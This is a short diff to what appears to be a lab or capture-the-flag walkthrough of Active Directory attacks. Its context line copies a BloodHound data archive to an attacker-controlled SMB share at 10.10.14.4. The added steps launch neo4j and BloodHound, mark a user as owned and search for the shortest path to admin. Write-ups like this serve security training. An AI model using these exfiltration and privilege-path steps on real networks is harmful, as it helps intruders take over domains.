@@ -120,3 +120,18 @@ copy 20230408050326_BloodHound.zip \\10.10.14.4\share\
 ```
 ![image](https://user-images.githubusercontent.com/33616880/230702582-cbaa9574-1756-4d57-9405-98a64c26d111.png)
 ![image](https://user-images.githubusercontent.com/33616880/230702543-ff4a81d9-d0e4-4c98-a178-ecd3f25e694f.png)
+
+
+```
+neo4j console
+```
+```
+./BloodHound --no-sandbox
+```
+![image](https://user-images.githubusercontent.com/33616880/230702699-6fd438f6-781c-4644-85b6-772e17713fd8.png)
+
+
+mark user as owned
+shortest to admin
+![image](https://user-images.githubusercontent.com/33616880/230702940-0fd2b84e-cecb-40f6-9f23-9e64f4a29a64.png)
+
